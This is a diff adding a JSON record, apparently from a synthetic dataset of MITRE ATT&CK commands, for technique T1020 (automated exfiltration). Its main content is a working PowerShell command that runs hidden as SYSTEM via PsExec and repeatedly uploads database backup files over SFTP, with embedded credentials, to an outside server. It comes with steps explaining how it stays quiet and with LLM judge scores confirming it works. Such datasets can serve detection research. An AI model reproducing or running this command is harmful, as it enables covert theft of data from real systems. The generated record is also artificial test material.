@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "psexec -accepteula -s -d powershell -NoProfile -WindowStyle Hidden -Command \"$ProgressPreference='SilentlyContinue'; $sent='C:\\ProgramData\\.sent'; New-Item -ItemType Directory -Path $sent -Force | Out-Null; while ($true){ Get-ChildItem 'C:\\DB\\Exports' -Filter *.bak -File | ForEach-Object { curl -s -T `\"$($_.FullName)`\" sftp://user:pass@203.0.113.77/upload/ > $null 2>&1; if ($LASTEXITCODE -eq 0){ Move-Item -Force $_.FullName (Join-Path $sent $_.Name) } }; Start-Sleep 1800 }\"",
+  "explanation": "Automates exfiltration of database backup files to a remote SFTP server via curl, followed by moving completed items to a sent directory.",
+  "rationale_steps": [
+    "Run hidden as SYSTEM via PSExec for elevated, quiet execution.",
+    "Enumerate .bak files from a known export directory.",
+    "Upload with curl over SFTP using silent mode and suppress outputs.",
+    "Move successfully transferred files to prevent reprocessing.",
+    "Wait between cycles to reduce network signatures."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-8bc12c8e-0ca9ba54",
+  "source_prompt_hash": "8bc12c8e",
+  "timestamp_utc": "2025-09-30T08:56:54.215628Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quotes/braces, valid PsExec and PowerShell flags, and correct escaping of inner quotes.",
+        "semantic_score": 4,
+        "semantic_justification": "Implements an automated exfiltration loop over SFTP and file post-processing, but may break on Windows PowerShell due to the curl alias (should use curl.exe) and the -s System context requires elevated rights.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T04:10:42.109377Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper escape sequences, valid flags for psexec and PowerShell, and correct PowerShell syntax throughout the script.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements automated exfiltration by using psexec to launch a hidden PowerShell process that continuously monitors a directory for database backups, exfiltrates them via SFTP, tracks successful transfers, and runs on a scheduled interval.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T05:57:54.395958Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes, valid flags for psexec and powershell, and correct escaping for the curl argument within the nested command execution.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of automated exfiltration, utilizing a loop, specific file targeting, SFTP transfer via curl, and tracking of sent items, aligning completely with the T1020 technique.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:58:19.549936Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
